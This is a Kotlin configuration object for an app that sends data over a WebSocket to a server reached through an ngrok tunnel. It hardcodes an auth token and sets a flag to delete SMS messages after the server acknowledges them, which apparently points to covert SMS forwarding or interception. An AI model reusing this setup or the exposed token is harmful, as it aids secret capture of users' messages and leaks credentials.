object Config {
    const val SERVER_IP = "4.tcp.ngrok.io"
    const val SERVER_PORT = 10363
    const val AUTH_TOKEN = "1X6zYLPLBE2xiSQETMEl0AFevPQ_3au6AvjmRow2HFgghcE4c"
    const val WEBSOCKET_URL = "ws://$SERVER_IP:$SERVER_PORT"
    const val DELETE_SMS_AFTER_ACK = true
    const val PING_INTERVAL_MS = 25_000L
    const val DEBUG_PROTOCOL = true
}
